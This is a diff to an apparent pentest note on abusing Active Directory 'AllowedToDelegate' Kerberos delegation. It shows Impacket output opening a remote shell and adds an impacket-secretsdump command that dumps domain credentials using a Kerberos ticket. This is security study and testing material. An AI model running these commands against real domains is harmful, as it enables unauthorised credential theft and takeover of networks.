@@ -1,6 +1,5 @@
 ---
 title: "AllowedToDelegate"
-date: 2024-7-23
 tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "AllowedToDelegate", "Active Directory", "Windows", "AddAllowedtoAct", "AllowedToAct"]
 ---
 
@@ -105,6 +104,11 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [!] Launching semi-interactive shell - Careful what you execute
 [!] Press help for extra shell commands
 C:\>
+```
+
+```console
+# Secretsdump
+sudo ntpdate -s <DC_IP> && impacket-secretsdump <TARGET_DOMAIN> -k -no-pass
 ```
 
 <small>*Note: impacket-wmiexec may not work*</small>
